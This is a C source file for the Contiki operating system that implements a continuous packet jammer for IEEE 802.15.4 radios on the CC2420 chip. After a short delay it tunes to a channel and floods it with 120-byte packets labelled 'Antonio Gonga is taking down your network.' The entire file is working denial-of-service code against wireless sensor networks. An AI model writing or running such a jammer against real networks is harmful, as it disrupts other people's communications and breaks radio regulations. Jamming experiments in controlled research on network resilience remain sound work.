/*
 A simple packet jammer for 802.15.4 networks. It sends as fast it can
 */

#include "contiki.h"
#include "net/rime.h"
#include "random.h"

#include "net/netstack.h"
#include "sys/rtimer.h"
#include "dev/button-sensor.h"

#include "dev/leds.h"

#include "./cc2420.h"

#include <stdio.h>
#include <string.h>

#define ONE_MS RTIMER_SECOND/1024
#define TS_LEN  6*ONE_MS

#define JAMMER_PACKET_LEN 120

typedef struct{
     uint8_t data[JAMMER_PACKET_LEN];
}jpacket_t;

static struct rtimer jammer_timer;
/*---------------------------------------------------------------------------*/
PROCESS(jammer_process_example, "Jammer example");
AUTOSTART_PROCESSES(&jammer_process_example);
/*---------------------------------------------------------------------------*/
static char jammer_process(struct rtimer rt, void* ptr){

    jpacket_t jpacket;
    memset(&jpacket, 0, sizeof(jpacket_t));
    
    strcpy(jpacket.data, "Antonio Gonga is taking down your network.");
    
    //CALL Radio Driver to transmit the Packet..
    NETSTACK_RADIO.send((void*)&jpacket, JAMMER_PACKET_LEN);     
    
    rtimer_clock_t timeNow = RTIMER_NOW() + 4; //2*ONE_MS;
    
    int ret = rtimer_set(&jammer_timer, timeNow, 1,
                             (void (*)(struct rtimer *, void *))jammer_process, NULL);  
    
    return 0;
}
/*---------------------------------------------------------------------------*/
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(jammer_process_example, ev, data)
{
  static struct etimer et;
  
  PROCESS_BEGIN();

  etimer_set(&et, CLOCK_SECOND * 15);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
  
  //set channel..
  cc2420_set_channel(RF_CHANNEL);

  while(1) {
     rtimer_clock_t timeNow = RTIMER_NOW() + ONE_MS;
     
     int ret = rtimer_set(&jammer_timer, timeNow, 1,
                             (void (*)(struct rtimer *, void *))jammer_process, NULL);
     PROCESS_YIELD();
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
